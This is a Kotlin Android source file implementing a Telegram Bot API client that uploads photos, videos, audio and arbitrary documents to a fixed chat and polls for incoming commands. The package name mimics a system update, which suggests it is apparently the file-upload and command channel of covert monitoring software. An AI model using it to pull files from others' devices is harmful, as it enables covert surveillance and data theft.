// language: Kotlin, file: TelegramApi.kt
// *إضافة sendVideo — لدعم مزامنة الفيديو*
// *كل الإرساليات موحّدة*

package com.sys.update2

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object TelegramApi {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun baseUrl(): String = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}"

    fun sendMessage(text: String, keyboard: JSONObject? = null): Int {
        return try {
            val json = JSONObject().apply {
                put("chat_id", Config.TELEGRAM_CHAT_ID)
                put("text", text)
                put("parse_mode", "Markdown")
                put("disable_web_page_preview", true)
                if (keyboard != null) put("reply_markup", keyboard)
            }.toString()

            val req = Request.Builder()
                .url("${baseUrl()}/sendMessage")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return 0
                val obj = JSONObject(body)
                if (obj.optBoolean("ok", false)) {
                    obj.optJSONObject("result")?.optInt("message_id", 0) ?: 0
                } else 0
            }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendMessage err: ${e.message}")
            0
        }
    }

    fun sendPhoto(file: File, caption: String = ""): Pair<Boolean, String> {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("photo", file.name, file.asRequestBody("image/*".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendPhoto").post(body).build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return Pair(false, "")
                val respBody = resp.body?.string() ?: return Pair(false, "")
                val obj = JSONObject(respBody)
                if (!obj.optBoolean("ok", false)) return Pair(false, "")
                val photos = obj.optJSONObject("result")?.optJSONArray("photo") ?: return Pair(false, "")
                if (photos.length() == 0) return Pair(false, "")
                val largest = photos.optJSONObject(photos.length() - 1)
                val fileId = largest?.optString("file_id", "") ?: ""
                Pair(fileId.isNotBlank(), fileId)
            }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendPhoto err: ${e.message}")
            Pair(false, "")
        }
    }

    fun sendVideo(file: File, caption: String = ""): Pair<Boolean, String> {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("supports_streaming", "true")
                .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendVideo").post(body).build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return Pair(false, "")
                val respBody = resp.body?.string() ?: return Pair(false, "")
                val obj = JSONObject(respBody)
                if (!obj.optBoolean("ok", false)) return Pair(false, "")
                val fileId = obj.optJSONObject("result")?.optJSONObject("video")?.optString("file_id", "") ?: ""
                Pair(fileId.isNotBlank(), fileId)
            }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendVideo err: ${e.message}")
            Pair(false, "")
        }
    }

    fun sendAudio(file: File, caption: String = ""): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("audio", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendAudio").post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendAudio err: ${e.message}")
            false
        }
    }

    fun sendDocument(file: File, caption: String = ""): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendDocument").post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendDocument err: ${e.message}")
            false
        }
    }

    fun getUpdates(offset: Long): JSONArray? {
        return try {
            val url = "${baseUrl()}/getUpdates?offset=$offset&timeout=${Config.POLL_TIMEOUT_S}"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return null
                val obj = JSONObject(body)
                if (obj.optBoolean("ok", false)) obj.optJSONArray("result") else null
            }
        } catch (e: Exception) {
            Log.e("TelegramApi", "getUpdates err: ${e.message}")
            null
        }
    }

    fun answerCallback(callbackId: String, text: String = ""): Boolean {
        return try {
            val json = JSONObject().apply {
                put("callback_query_id", callbackId)
                if (text.isNotBlank()) put("text", text)
            }.toString()
            val req = Request.Builder()
                .url("${baseUrl()}/answerCallbackQuery")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { true }
        } catch (_: Exception) { false }
    }

    fun getFile(fileId: String): String? {
        return try {
            val url = "${baseUrl()}/getFile?file_id=$fileId"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return null
                val obj = JSONObject(body)
                if (!obj.optBoolean("ok", false)) return null
                obj.optJSONObject("result")?.optString("file_path", "")
            }
        } catch (e: Exception) {
            Log.e("TelegramApi", "getFile err: ${e.message}")
            null
        }
    }
}
